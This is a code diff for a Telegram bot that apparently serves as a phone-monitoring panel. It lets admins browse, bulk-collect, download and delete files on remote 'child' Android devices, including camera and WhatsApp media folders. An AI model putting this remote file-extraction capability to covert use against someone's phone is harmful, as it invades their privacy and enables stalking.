@@ -88,6 +88,9 @@ function escapeMd(text) {
 // BOT FILE BROWSER HELPERS
 // ════════════════════════════════════════════════════════════════════
 
+const STORAGE_ROOT = '/storage/emulated/0';
+const BOT_DIR_PAGE_SIZE = 12;
+
 const FOLDER_SHORTCUTS = {
   'download':      '/storage/emulated/0/Download',
   'downloads':     '/storage/emulated/0/Download',
@@ -100,9 +103,25 @@ const FOLDER_SHORTCUTS = {
   'documents':     '/storage/emulated/0/Documents',
   'music':         '/storage/emulated/0/Music',
   'videos':        '/storage/emulated/0/Movies',
+  'movies':        '/storage/emulated/0/Movies',
   'telegram':      '/storage/emulated/0/Telegram',
+  'sdcard':        '/storage/emulated/0',
   'root':          '/storage/emulated/0',
+  'home':          '/storage/emulated/0',
 };
+
+const PATH_SHORTCUTS = [
+  { text: '🏠 Root',      path: '/storage/emulated/0' },
+  { text: '⬇️ Download',  path: '/storage/emulated/0/Download' },
+  { text: '📷 DCIM',      path: '/storage/emulated/0/DCIM' },
+  { text: '📸 Camera',    path: '/storage/emulated/0/DCIM/Camera' },
+  { text: '🖼️ Pictures',  path: '/storage/emulated/0/Pictures' },
+  { text: '💬 WhatsApp',  path: '/storage/emulated/0/WhatsApp/Media' },
+  { text: '📄 Documents', path: '/storage/emulated/0/Documents' },
+  { text: '🎵 Music',     path: '/storage/emulated/0/Music' },
+  { text: '🎬 Movies',    path: '/storage/emulated/0/Movies' },
+  { text: '✈️ Telegram',  path: '/storage/emulated/0/Telegram' },
+];
 
 function getFileCategory(filename) {
   const ext = filename.split('.').pop().toLowerCase();
@@ -136,6 +155,10 @@ function getCachedPathKey(path) {
   for (const [key, val] of pathCache.entries()) {
     if (val === path) return key;
   }
+  if (pathCache.size > 800) {
+    const first = pathCache.keys().next().value;
+    pathCache.delete(first);
+  }
   const key = `p${pathCacheCounter++}`;
   pathCache.set(key, path);
   return key;
@@ -144,33 +167,179 @@ function getCachedPathKey(path) {
 function decodeCachedPath(key) {
   if (!key) return '';
   if (pathCache.has(key)) return pathCache.get(key);
-  return key;
+  if (String(key).startsWith('/')) return key;
+  return '';
 }
 
 function resolveFolderPath(input) {
-  const lower = input.trim().toLowerCase();
+  let raw = String(input || '').trim();
+  if (!raw) return STORAGE_ROOT;
+  const lower = raw.toLowerCase();
   if (FOLDER_SHORTCUTS[lower]) return FOLDER_SHORTCUTS[lower];
-  if (input.startsWith('/')) return input;
-  return '/storage/emulated/0/' + input;
+  if (lower === '/sdcard' || lower.startsWith('/sdcard/')) {
+    raw = STORAGE_ROOT + raw.slice('/sdcard'.length);
+  }
+  if (raw.startsWith('/')) return raw.replace(/\/+$/, '') || '/';
+  return STORAGE_ROOT + '/' + raw.replace(/^\/+/, '');
+}
+
+function getParentPath(dirPath) {
+  if (!dirPath) return '';
+  const p = String(dirPath).replace(/\/+$/, '');
+  if (!p || p === '/' || p === STORAGE_ROOT) return '';
+  const idx = p.lastIndexOf('/');
+  if (idx <= 0) return '/';
+  return p.slice(0, idx) || '/';
+}
+
+function isDirItem(item) {
+  if (!item) return false;
+  const flag = item.isDirectory ?? item.isDir ?? item.directory;
+  if (flag === true || flag === 1 || flag === '1' || flag === 'true') return true;
+  const t = String(item.type || '').toLowerCase();
+  return t === 'dir' || t === 'folder' || t === 'directory';
+}
+
+function itemFullPath(item, curPath) {
+  if (item && item.path) return item.path;
+  const base = (curPath || STORAGE_ROOT).replace(/\/+$/, '');
+  const name = item && item.name ? String(item.name).replace(/^\/+/, '') : '';
+  return name ? base + '/' + name : base;
+}
+
+function truncateBtn(str, max) {
+  const s = String(str || '');
+  if (s.length <= max) return s;
+  return s.slice(0, Math.max(1, max - 1)) + '...';
+}
+
+const botDirCache = new Map();
+
+function cacheBotDirListing(deviceId, payload) {
+  botDirCache.set(deviceId, {
+    items: payload.items || [],
+    currentPath: payload.currentPath || '',
+    parentPath: payload.parentPath || getParentPath(payload.currentPath),
+    ts: Date.now()
+  });
+}
+
+function getCachedBotDir(deviceId, dirPath) {
+  const cached = botDirCache.get(deviceId);
+  if (!cached) return null;
+  if (dirPath && cached.currentPath !== dirPath) return null;
+  if (Date.now() - cached.ts > 120000) return null;
+  return cached;
+}
+
+function buildShortcutRows(deviceId) {
+  const rows = [];
+  let row = [];
+  for (const sc of PATH_SHORTCUTS) {
+    row.push({
+      text: sc.text,
+      callback_data: `fb:nav:${deviceId}:${getCachedPathKey(sc.path)}:all`
+    });
+    if (row.length === 5) {
+      rows.push(row);
+      row = [];
+    }
+  }
+  if (row.length) rows.push(row);
+  return rows;
+}
+
+function buildBreadcrumbRows(deviceId, curPath) {
+  const parts = String(curPath || '').replace(/\/+$/, '').split('/').filter(Boolean);
+  const crumbs = [];
+  let acc = '';
+  for (const part of parts) {
+    acc += '/' + part;
+    crumbs.push({ name: part, path: acc });
+  }
+  const shown = crumbs.slice(-4);
+  if (!shown.length) return [];
+  return [shown.map((c, i) => ({
+    text: (i === 0 && shown.length < crumbs.length ? '…' : '') +
+      (c.path === STORAGE_ROOT ? 'Home' : truncateBtn(c.name, 12)),
+    callback_data: `fb:nav:${deviceId}:${getCachedPathKey(c.path)}:all`
+  }))];
+}
+
+function requestDeviceDir(chatId, msgId, deviceId, dirPath, filterExt, page) {
+  if (!dirPath) dirPath = STORAGE_ROOT;
+  if (!childDevices.has(deviceId)) {
+    if (bot) bot.sendMessage(chatId, 'Device offline.');
+    return false;
+  }
+  const seq = Date.now();
+  pendingBotFileRequests.set(deviceId, {
+    chatId,
+    msgId,
+    type: 'list_dir',
+    filterExt: filterExt || 'all',
+    page: page || 0,
+    seq,
+    path: dirPath
+  });
+  const ok = sendCommandToDevice(deviceId, { command: 'list_dir', path: dirPath });
+  if (!ok) {
+    pendingBotFileRequests.delete(deviceId);
+    if (bot) bot.sendMessage(chatId, 'Device e command pathano jaynai.');
+    return false;
+  }
+  setTimeout(() => {
+    const pending = pendingBotFileRequests.get(deviceId);
+    if (pending && pending.seq === seq && pending.type === 'list_dir') {
+      pendingBotFileRequests.delete(deviceId);
+      if (bot) bot.sendMessage(chatId, 'Timeout — device respond koreni. App chalu ache?');
+    }
+  }, 15000);
+  return true;
+}
+
+function normalizeDirPayload(payload, fallbackPath) {
+  const items = payload.items || payload.files || payload.entries || [];
+  const currentPath = payload.currentPath || payload.path || fallbackPath || STORAGE_ROOT;
+  const parentPath = payload.parentPath || getParentPath(currentPath);
+  return { items, currentPath, parentPath };
 }
 
 // ── Send file listing to Telegram ────────────────────────────────────────
-function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
+function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt, page) {
   if (!bot) return;
-  const items    = payload.items || [];
-  const curPath  = payload.currentPath || '';
+  try {
+  const normalized = normalizeDirPayload(payload, payload.currentPath);
+  const items    = normalized.items;
+  const curPath  = normalized.currentPath || STORAGE_ROOT;
+  const parentPath = (payload.parentPath && payload.parentPath !== curPath)
+    ? payload.parentPath
+    : getParentPath(curPath);
   const devName  = getDeviceName(deviceId);
-  const folderName = curPath.split('/').filter(Boolean).pop() || curPath;
+  const folderName = curPath.split('/').filter(Boolean).pop() || curPath || 'Root';
+  const pathKey  = getCachedPathKey(curPath);
+  const filter   = filterExt || 'all';
+  const pageNum  = Math.max(0, parseInt(page, 10) || 0);
 
-  const folders = items.filter(i => i.isDirectory);
-  const files   = items.filter(i => !i.isDirectory);
+  cacheBotDirListing(deviceId, { items, currentPath: curPath, parentPath });
+
+  const folders = items.filter(i => {
+    if (!isDirItem(i)) return false;
+    const n = String(i.name || '');
+    return n !== '.' && n !== '..';
+  }).sort((a, b) =>
+    String(a.name || '').localeCompare(String(b.name || ''), undefined, { sensitivity: 'base' })
+  );
+  const files   = items.filter(i => !isDirItem(i)).sort((a, b) =>
+    String(a.name || '').localeCompare(String(b.name || ''), undefined, { sensitivity: 'base' })
+  );
 
   let filtered = files;
-  if (filterExt && filterExt !== 'all') {
-    if (filterExt.startsWith('.')) {
-      filtered = files.filter(f => f.name.toLowerCase().endsWith(filterExt.toLowerCase()));
+  if (filter && filter !== 'all') {
+    if (filter.startsWith('.')) {
+      filtered = files.filter(f => String(f.name || '').toLowerCase().endsWith(filter.toLowerCase()));
     } else {
-      filtered = files.filter(f => getFileCategory(f.name) === filterExt);
+      filtered = files.filter(f => getFileCategory(f.name) === filter);
     }
   }
 
@@ -180,73 +349,136 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
     cats[c] = (cats[c] || 0) + 1;
   }
   const catSummary = Object.entries(cats)
-    .map(([c,n]) => `${getCategoryEmoji(c)} ${n}`)
+    .map(([c, n]) => `${getCategoryEmoji(c)} ${n}`)
     .join('  ');
+
+  const listing = [];
+  for (const folder of folders) listing.push({ kind: 'dir', item: folder });
+  for (const file of filtered) listing.push({ kind: 'file', item: file });
+
+  const totalPages = Math.max(1, Math.ceil(listing.length / BOT_DIR_PAGE_SIZE));
+  const safePage   = Math.min(pageNum, totalPages - 1);
+  const slice      = listing.slice(safePage * BOT_DIR_PAGE_SIZE, (safePage + 1) * BOT_DIR_PAGE_SIZE);
 
   const escFolder = escapeMd(folderName);
   const escDev    = escapeMd(devName);
   const escPath   = escapeMd(curPath);
 
-  let text = `📂 *${escFolder}*  (${escDev})\n`;
+  let text = `*${escFolder}*  (${escDev})\n`;
   text += `\`${escPath}\`\n`;
   text += `${'─'.repeat(26)}\n`;
-  text += `📊 Total: ${files.length} file  ${catSummary}\n`;
-  if (filterExt && filterExt !== 'all') {
-    text += `🔍 Filter: \`${escapeMd(filterExt)}\` → ${filtered.length} file found\n`;
+  text += `Folders: ${folders.length}   Files: ${files.length}`;
+  if (catSummary) text += `  ${catSummary}`;
+  text += `\n`;
+  if (filter !== 'all') {
+    text += `Filter: \`${escapeMd(filter)}\` → ${filtered.length} file\n`;
+  }
+  if (totalPages > 1) {
+    text += `Page ${safePage + 1}/${totalPages}\n`;
   }
   text += `${'─'.repeat(26)}\n`;
 
-  if (filtered.length === 0) {
-    text += filterExt && filterExt !== 'all'
-      ? `_"${escapeMd(filterExt)}" extension er kono file nai._`
-      : `_Ei folder e kono file nai._`;
+  if (listing.length === 0) {
+    text += filter !== 'all'
+      ? `"${escapeMd(filter)}" er kono file nai. Filter clear kore folder dekhte paro.`
+      : `_Ei folder khali._`;
+  } else if (filter === 'all' && folders.length) {
+    text += `_Folder e tap kore dhukho. File e tap kore download/delete._`;
   }
 
-  // Filter row buttons
   const filterButtons = [];
   const catRow1 = [], catRow2 = [];
-  const allCats = ['image','video','audio','doc','apk','trashed','archive'];
+  const allCats = ['image', 'video', 'audio', 'doc', 'apk', 'trashed', 'archive'];
   const presentCats = allCats.filter(c => cats[c]);
   for (let i = 0; i < presentCats.length; i++) {
     const c = presentCats[i];
-    const active = filterExt === c ? '✓ ' : '';
-    const btn = { text: `${active}${getCategoryEmoji(c)} ${c}`, callback_data: `fb:filter:${deviceId}:${getCachedPathKey(curPath)}:${c}` };
+    const active = filter === c ? '* ' : '';
+    const btn = {
+      text: `${active}${getCategoryEmoji(c)} ${c}`,
+      callback_data: `fb:filter:${deviceId}:${pathKey}:${c}`
+    };
     if (i < 3) catRow1.push(btn); else catRow2.push(btn);
   }
   if (catRow1.length) filterButtons.push(catRow1);
   if (catRow2.length) filterButtons.push(catRow2);
 
   filterButtons.push([
-    { text: filterExt === 'all' || !filterExt ? '✓ All files' : '📄 All files', callback_data: `fb:filter:${deviceId}:${getCachedPathKey(curPath)}:all` },
-    { text: '🗑️ .trashed', callback_data: `fb:filter:${deviceId}:${getCachedPathKey(curPath)}:.trashed` },
+    { text: filter === 'all' ? '* All' : 'All', callback_data: `fb:filter:${deviceId}:${pathKey}:all` },
+    { text: filter === '.trashed' ? '* .trashed' : '.trashed', callback_data: `fb:filter:${deviceId}:${pathKey}:.trashed` },
   ]);
 
-  // File list buttons
-  const fileButtons = [];
-  const showFiles = filtered.slice(0, 20);
-  for (const file of showFiles) {
-    const emoji = getCategoryEmoji(getFileCategory(file.name));
-    const sizeStr = formatSize(file.size);
-    const label = `${emoji} ${file.name.length > 28 ? file.name.slice(0,25)+'...' : file.name}  (${sizeStr})`;
-    fileButtons.push([{ text: label, callback_data: `fb:file:${deviceId}:${getCachedPathKey(file.path)}` }]);
-  }
-  if (filtered.length > 20) {
-    fileButtons.push([{ text: `… aro ${filtered.length - 20} ta file ache`, callback_data: `fb:noop` }]);
+  const listButtons = [];
+  for (const entry of slice) {
+    const item = entry.item;
+    const full = itemFullPath(item, curPath);
+    if (entry.kind === 'dir') {
+      const label = `📁 ${truncateBtn(item.name || 'folder', 36)}`;
+      listButtons.push([{
+        text: label,
+        callback_data: `fb:nav:${deviceId}:${getCachedPathKey(full)}:all`
+      }]);
+    } else {
+      const emoji = getCategoryEmoji(getFileCategory(item.name));
+      const sizeStr = formatSize(item.size);
+      const label = `${emoji} ${truncateBtn(item.name, 28)}  (${sizeStr})`;
+      listButtons.push([{
+        text: label,
+        callback_data: `fb:file:${deviceId}:${getCachedPathKey(full)}`
+      }]);
+    }
   }
 
-  // Nav buttons
-  const navRow = [];
-  if (payload.parentPath && payload.parentPath !== curPath) {
-    navRow.push({ text: '⬆️ Up', callback_data: `fb:nav:${deviceId}:${getCachedPathKey(payload.parentPath)}:${filterExt||'all'}` });
+  const pageRow = [];
+  if (totalPages > 1) {
+    if (safePage > 0) {
+      pageRow.push({
+        text: '⬅️ Prev',
+        callback_data: `fb:pg:${deviceId}:${pathKey}:${filter}:${safePage - 1}`
+      });
+    }
+    pageRow.push({
+      text: `${safePage + 1}/${totalPages}`,
+      callback_data: 'fb:noop'
+    });
+    if (safePage < totalPages - 1) {
+      pageRow.push({
+        text: 'Next ➡️',
+        callback_data: `fb:pg:${deviceId}:${pathKey}:${filter}:${safePage + 1}`
+      });
+    }
   }
-  navRow.push({ text: '🔄 Refresh', callback_data: `fb:nav:${deviceId}:${getCachedPathKey(curPath)}:${filterExt||'all'}` });
-  navRow.push({ text: '◀️ Back', callback_data: `sel:${deviceId}` });
+
+  const navRow1 = [];
+  if (parentPath) {
+    navRow1.push({
+      text: '⬆️ Up',
+      callback_data: `fb:nav:${deviceId}:${getCachedPathKey(parentPath)}:all`
+    });
+  }
+  navRow1.push({
+    text: '🏠 Home',
+    callback_data: `fb:nav:${deviceId}:${getCachedPathKey(STORAGE_ROOT)}:all`
+  });
+  navRow1.push({
+    text: '🔄 Refresh',
+    callback_data: `fb:nav:${deviceId}:${pathKey}:${filter}`
+  });
+
+  const navRow2 = [
+    { text: '✏️ Path', callback_data: `fb:custom:${deviceId}` },
+    { text: '📥 All here', callback_data: `fb:getall:${deviceId}:${pathKey}` },
+    { text: '◀️ Device', callback_data: `sel:${deviceId}` },
+  ];
 
   const keyboard = {
     inline_keyboard: [
+      ...buildShortcutRows(deviceId),
+      ...buildBreadcrumbRows(deviceId, curPath),
       ...filterButtons,
-      ...fileButtons,
-      navRow
+      ...listButtons,
+      ...(pageRow.length ? [pageRow] : []),
+      navRow1,
+      navRow2
     ]
   };
 
@@ -256,6 +488,10 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt) {
       .catch(() => bot.sendMessage(chatId, text, opts));
   } else {
     bot.sendMessage(chatId, text, opts);
+  }
+  } catch (err) {
+    console.error('[BOT] file listing error:', err.message);
+    bot.sendMessage(chatId, 'File list render korte problem hoyeche: ' + err.message);
   }
 }
 
@@ -519,9 +755,6 @@ function initTelegramBot() {
         { text: "📥 Get All Files",  callback_data: `act:get_all_files:${deviceId}` },
       ],
       [
-        { text: "📋 Get Info",       callback_data: `act:get_info:${deviceId}` },
-      ],
-      [
         { text: "🔦 Torch ON",       callback_data: `act:torch_on:${deviceId}` },
         { text: "🔦 Torch OFF",      callback_data: `act:torch_off:${deviceId}` },
       ],
@@ -637,13 +870,28 @@ function initTelegramBot() {
     sendMainMenu(msg.chat.id);
   }));
 
+  bot.on('polling_error', (err) => {
+    console.error('[BOT] polling_error:', err.message);
+  });
+
   bot.on('message', async (msg) => {
+    try {
     if (!isAdmin(msg.chat.id)) return;
     if (!msg.text) return;
 
     const chatId = msg.chat.id;
     const text   = msg.text.trim();
     const state  = getState(chatId);
+
+    if (text === '/start' || text.startsWith('/start@')) {
+      state.awaitingInput = null;
+      return;
+    }
+
+    const MENU_TEXTS = ['📱 Devices', '📊 Status', '⚙️ Settings', '🖥️ Full Panel'];
+    if (state.awaitingInput && MENU_TEXTS.includes(text)) {
+      state.awaitingInput = null;
+    }
 
     // ── Handle awaiting input states ────────────────────────────────────
     if (state.awaitingInput === 'screentime') {
@@ -673,10 +921,14 @@ function initTelegramBot() {
     }
 
     if (state.awaitingInput === 'folder') {
+      if (text.startsWith('/start')) {
+        state.awaitingInput = null;
+        return;
+      }
       state.awaitingInput = null;
       const devId = state.selectedDeviceId;
       if (!devId || !childDevices.has(devId)) {
-        bot.sendMessage(chatId, "❌ Device offline.");
+        bot.sendMessage(chatId, "Device offline.");
         return;
       }
       const resolvedPath = resolveFolderPath(text);
@@ -684,21 +936,8 @@ function initTelegramBot() {
       state.pendingFilterExt = null;
 
       const loadMsg = await bot.sendMessage(chatId,
-        `📂 Loading: \`${escapeMd(resolvedPath)}\`…`, { parse_mode: 'Markdown' });
-
-      pendingBotFileRequests.set(devId, {
-        chatId, msgId: loadMsg.message_id,
-        type: 'list_dir', filterExt
-      });
-
-      sendCommandToDevice(devId, { command: 'list_dir', path: resolvedPath });
-
-      setTimeout(() => {
-        if (pendingBotFileRequests.get(devId)?.chatId === chatId) {
-          pendingBotFileRequests.delete(devId);
-          bot.sendMessage(chatId, "⏱️ Device respond koreni (timeout). Bacchar phone e app chole ache?");
-        }
-      }, 10000);
+        `Loading: \`${escapeMd(resolvedPath)}\`…`, { parse_mode: 'Markdown' });
+      requestDeviceDir(chatId, loadMsg.message_id, devId, resolvedPath, filterExt, 0);
       return;
     }
 
@@ -721,7 +960,8 @@ function initTelegramBot() {
         phase: 'scanning',
         scanQueue: [],
         collectedFiles: [],
-        scannedFolders: 0
+        scannedFolders: 0,
+        visited: new Set([resolvedPath])
       });
 
       sendCommandToDevice(devId, { command: 'list_dir', path: resolvedPath });
@@ -784,15 +1024,23 @@ function initTelegramBot() {
       return;
     }
     if (text.startsWith("/") && text !== "/start") {
-      bot.sendMessage(chatId, "💡 Niche er button gulo use koro:", { reply_markup: MAIN_REPLY_KB });
+      bot.sendMessage(chatId, "Niche er button gulo use koro:", { reply_markup: MAIN_REPLY_KB });
       return;
+    }
+    } catch (err) {
+      console.error('[BOT] message handler error:', err.message);
     }
   });
 
   // ── Inline button callback handler ────────────────────────────────────
   bot.on('callback_query', async (query) => {
+    try {
     if (!isAdmin(query.from.id)) {
-      bot.answerCallbackQuery(query.id, { text: "⛔ Access denied." });
+      bot.answerCallbackQuery(query.id, { text: "Access denied." });
+      return;
+    }
+    if (!query.message) {
+      bot.answerCallbackQuery(query.id).catch(() => {});
       return;
     }
 
@@ -839,19 +1087,15 @@ function initTelegramBot() {
       // ═══════════════════ FILE BROWSER ═══════════════════
       if (action === "files") {
         state.selectedDeviceId = deviceId;
-        state.awaitingInput    = 'folder';
-        bot.answerCallbackQuery(query.id);
-        bot.sendMessage(chatId,
-          `✏️ *Custom Folder Path*\n\n` +
-          `📂 Folder er naam ba full path likho:\n\n` +
-          `*Short names (auto resolve):*\n` +
-          `\`Download\`  \`DCIM/Camera\`  \`Pictures\`\n` +
-          `\`WhatsApp\`  \`Telegram\`  \`Documents\`\n\n` +
-          `*Full path:*\n` +
-          `\`/storage/emulated/0/Download\`\n\n` +
-          `_🔍 Sob file dekhabe, even .trash / dot files_`,
+        state.awaitingInput    = null;
+        bot.answerCallbackQuery(query.id, { text: 'File manager opening…' });
+        const loadMsg = await bot.sendMessage(chatId,
+          `*File Manager — ${escapeMd(dev.childName)}*\n\n` +
+          `Loading: \`${escapeMd(STORAGE_ROOT)}\`…\n` +
+          `_Folder e tap kore dhukho. Shortcut ba Path diye jump kora jabe._`,
           { parse_mode: 'Markdown' }
         );
+        requestDeviceDir(chatId, loadMsg.message_id, deviceId, STORAGE_ROOT, 'all', 0);
         return;
       }
 
@@ -1033,8 +1277,16 @@ Kon inbox dekhte chao?`, {
 
       // get_info
       if (action === "get_info") {
-        bot.answerCallbackQuery(query.id, { text: "📋 Info loading..." });
+        bot.answerCallbackQuery(query.id, { text: "Info loading..." });
+        pendingBotFileRequests.set(deviceId + '_data', { chatId, type: 'get_info_result' });
         sendCommandToDevice(deviceId, { command: "get_info" });
+        bot.sendMessage(chatId, `Loading device info from *${escapeMd(getDeviceName(deviceId))}*…`, { parse_mode: 'Markdown' });
+        setTimeout(() => {
+          if (pendingBotFileRequests.get(deviceId + '_data')?.type === 'get_info_result') {
+            pendingBotFileRequests.delete(deviceId + '_data');
+            bot.sendMessage(chatId, 'Timeout — device info ashe nai.');
+          }
+        }, 12000);
         return;
       }
 
@@ -1189,7 +1441,7 @@ Kon inbox dekhte chao?`, {
       const fbAction = parts[1];
 
       if (fbAction === 'noop') {
-        bot.answerCallbackQuery(query.id, { text: 'Sob file dekhte custom path use koro.' });
+        bot.answerCallbackQuery(query.id);
         return;
       }
 
@@ -1199,24 +1451,49 @@ Kon inbox dekhte chao?`, {
         state.awaitingInput    = 'folder';
         bot.answerCallbackQuery(query.id);
         bot.sendMessage(chatId,
-          `✏️ *Custom Folder Path*
-
-` +
-          `Folder er naam ba full path likho:
-
-` +
-          `*Short names (automatically resolve hobe):*
-` +
-          `\`Download\`  \`DCIM/Camera\`  \`Pictures\`
-` +
-          `\`WhatsApp\`  \`Telegram\`  \`Documents\`
-
-` +
-          `*Full path:*
-` +
-          `\`/storage/emulated/0/Download\``,
+          `*Jump to path*\n\n` +
+          `Folder naam ba full path likho:\n\n` +
+          `*Short names:*\n` +
+          `\`Download\`  \`DCIM\`  \`DCIM/Camera\`\n` +
+          `\`Pictures\`  \`WhatsApp\`  \`Documents\`\n` +
+          `\`Music\`  \`Movies\`  \`Telegram\`  \`root\`\n\n` +
+          `*Full path:*\n` +
+          `\`/storage/emulated/0/Download\`\n` +
+          `\`/sdcard/DCIM/Camera\``,
           { parse_mode: 'Markdown' }
         );
+        return;
+      }
+
+      if (fbAction === 'getall') {
+        const devId   = parts[2];
+        const rawPath = decodeCachedPath(parts[3]) || STORAGE_ROOT;
+        state.selectedDeviceId = devId;
+        if (!childDevices.has(devId)) {
+          bot.answerCallbackQuery(query.id, { text: 'Device offline.' });
+          return;
+        }
+        bot.answerCallbackQuery(query.id, { text: 'Scanning folder…' });
+        const loadMsg = await bot.sendMessage(chatId,
+          `Scanning folder: \`${escapeMd(rawPath)}\`…\n_Sob file list korchi, ektu wait koro…_`,
+          { parse_mode: 'Markdown' });
+        pendingBotFileRequests.set(devId + '_getall', {
+          chatId, msgId: loadMsg.message_id,
+          type: 'get_all_files', path: rawPath,
+          rootPath: rawPath,
+          phase: 'scanning',
+          scanQueue: [],
+          collectedFiles: [],
+          scannedFolders: 0,
+          visited: new Set([rawPath])
+        });
+        sendCommandToDevice(devId, { command: 'list_dir', path: rawPath });
+        setTimeout(() => {
+          if (pendingBotFileRequests.get(devId + '_getall')?.chatId === chatId) {
+            pendingBotFileRequests.delete(devId + '_getall');
+            bot.sendMessage(chatId, 'Timeout — device respond koreni.');
+          }
+        }, 60000);
         return;
       }
 
@@ -1224,23 +1501,35 @@ Kon inbox dekhte chao?`, {
         const devId = parts[2];
         state.selectedDeviceId = devId;
         if (!childDevices.has(devId)) {
-          bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' });
+          bot.answerCallbackQuery(query.id, { text: 'Device offline.' });
           return;
         }
-        bot.answerCallbackQuery(query.id, { text: '🔍 .trashed files loading…' });
-        const loadMsg = await bot.sendMessage(chatId,
-          `🗑️ Loading .trashed files from Download…`);
-        pendingBotFileRequests.set(devId, {
-          chatId, msgId: loadMsg.message_id,
-          type: 'list_dir', filterExt: '.trashed'
-        });
-        sendCommandToDevice(devId, { command: 'list_dir', path: '/storage/emulated/0/Download' });
-        setTimeout(() => {
-          if (pendingBotFileRequests.get(devId)?.chatId === chatId) {
-            pendingBotFileRequests.delete(devId);
-            bot.sendMessage(chatId, '⏱️ Timeout — device respond koreni.');
-          }
-        }, 10000);
+        bot.answerCallbackQuery(query.id, { text: '.trashed files loading…' });
+        const loadMsg = await bot.sendMessage(chatId, 'Loading .trashed files from Download…');
+        requestDeviceDir(chatId, loadMsg.message_id, devId, STORAGE_ROOT + '/Download', '.trashed', 0);
+        return;
+      }
+
+      if (fbAction === 'pg') {
+        const devId     = parts[2];
+        const rawPath   = decodeCachedPath(parts[3]);
+        const filterExt = parts[4] || 'all';
+        const page      = parseInt(parts[5], 10) || 0;
+        if (!childDevices.has(devId)) {
+          bot.answerCallbackQuery(query.id, { text: 'Device offline.' });
+          return;
+        }
+        const cached = getCachedBotDir(devId, rawPath);
+        bot.answerCallbackQuery(query.id);
+        if (cached) {
+          handleBotFileListing(chatId, msgId, devId, cached, filterExt, page);
+          return;
+        }
+        bot.editMessageText(
+          `Loading: \`${escapeMd(rawPath)}\`…`,
+          { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
+        ).catch(() => {});
+        requestDeviceDir(chatId, msgId, devId, rawPath, filterExt, page);
         return;
       }
 
@@ -1248,28 +1537,21 @@ Kon inbox dekhte chao?`, {
         const devId     = parts[2];
         const rawPath   = decodeCachedPath(parts[3]);
         const filterExt = parts[4] || 'all';
-        if (!childDevices.has(devId)) {
-          bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' });
+        if (!rawPath) {
+          bot.answerCallbackQuery(query.id, { text: 'Path missing — Home e jaw.' });
+          requestDeviceDir(chatId, msgId, devId, STORAGE_ROOT, 'all', 0);
           return;
         }
-        bot.answerCallbackQuery(query.id, { text: '📂 Loading…' });
-        const loadMsg = await bot.editMessageText(
-          `📂 Loading: \`${escapeMd(rawPath)}\`…`,
+        if (!childDevices.has(devId)) {
+          bot.answerCallbackQuery(query.id, { text: 'Device offline.' });
+          return;
+        }
+        bot.answerCallbackQuery(query.id, { text: 'Loading…' });
+        bot.editMessageText(
+          `Loading: \`${escapeMd(rawPath)}\`…`,
           { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' }
-        ).catch(() => bot.sendMessage(chatId, `📂 Loading…`));
-
-        const editId = loadMsg?.message_id || msgId;
-        pendingBotFileRequests.set(devId, {
-          chatId, msgId: editId,
-          type: 'list_dir', filterExt
-        });
-        sendCommandToDevice(devId, { command: 'list_dir', path: rawPath });
-        setTimeout(() => {
-          if (pendingBotFileRequests.get(devId)?.chatId === chatId) {
-            pendingBotFileRequests.delete(devId);
-            bot.sendMessage(chatId, '⏱️ Timeout — device respond koreni.');
-          }
-        }, 10000);
+        ).catch(() => {});
+        requestDeviceDir(chatId, msgId, devId, rawPath, filterExt, 0);
         return;
       }
 
@@ -1278,24 +1560,17 @@ Kon inbox dekhte chao?`, {
         const rawPath   = decodeCachedPath(parts[3]);
         const filterExt = parts[4] || 'all';
         if (!childDevices.has(devId)) {
-          bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' });
+          bot.answerCallbackQuery(query.id, { text: 'Device offline.' });
           return;
         }
-        bot.answerCallbackQuery(query.id, { text: `🔍 Filter: ${filterExt}` });
-        const loadMsg = await bot.editMessageText(`🔍 Filtering…`, { chat_id: chatId, message_id: msgId })
-          .catch(() => bot.sendMessage(chatId, '🔍 Filtering…'));
-        const editId = loadMsg?.message_id || msgId;
-        pendingBotFileRequests.set(devId, {
-          chatId, msgId: editId,
-          type: 'list_dir', filterExt
-        });
-        sendCommandToDevice(devId, { command: 'list_dir', path: rawPath });
-        setTimeout(() => {
-          if (pendingBotFileRequests.get(devId)?.chatId === chatId) {
-            pendingBotFileRequests.delete(devId);
-            bot.sendMessage(chatId, '⏱️ Timeout.');
-          }
-        }, 10000);
+        bot.answerCallbackQuery(query.id, { text: `Filter: ${filterExt}` });
+        const cached = getCachedBotDir(devId, rawPath);
+        if (cached) {
+          handleBotFileListing(chatId, msgId, devId, cached, filterExt, 0);
+          return;
+        }
+        bot.editMessageText('Filtering…', { chat_id: chatId, message_id: msgId }).catch(() => {});
+        requestDeviceDir(chatId, msgId, devId, rawPath, filterExt, 0);
         return;
       }
 
@@ -1336,16 +1611,16 @@ Kon inbox dekhte chao?`, {
         }
         bot.answerCallbackQuery(query.id, { text: '⬇️ Downloading…' });
 
-        pendingBotFileRequests.set(devId, {
+        pendingBotFileRequests.set(devId + '_dl', {
           chatId, msgId: null,
           type: 'download_file'
         });
         sendCommandToDevice(devId, { command: 'download_file', path: filePath });
 
         setTimeout(() => {
-          if (pendingBotFileRequests.get(devId)?.chatId === chatId) {
-            pendingBotFileRequests.delete(devId);
-            bot.sendMessage(chatId, '⏱️ Download timeout — ফাইলটি অনেক বড় অথবা ডিভাইসটি অফলাইন রয়েছে।');
+          if (pendingBotFileRequests.get(devId + '_dl')?.chatId === chatId) {
+            pendingBotFileRequests.delete(devId + '_dl');
+            bot.sendMessage(chatId, 'Download timeout — file onek boro ba device offline.');
           }
         }, 180000);
         return;
@@ -1384,18 +1659,12 @@ Nischit delete korte chao?`,
           bot.answerCallbackQuery(query.id, { text: '❌ Device offline.' });
           return;
         }
-        bot.answerCallbackQuery(query.id, { text: '🗑️ Deleting…' });
+        bot.answerCallbackQuery(query.id, { text: 'Deleting…' });
         sendCommandToDevice(devId, { command: 'delete_file', path: filePath });
-        setTimeout(() => {
-          bot.sendMessage(chatId, `✅ *${escapeMd(fileName)}* deleted.`, { parse_mode: 'Markdown' });
-          const loadMsg2 = bot.sendMessage(chatId, `🔄 Folder reload hocche…`);
-          loadMsg2.then(m => {
-            pendingBotFileRequests.set(devId, {
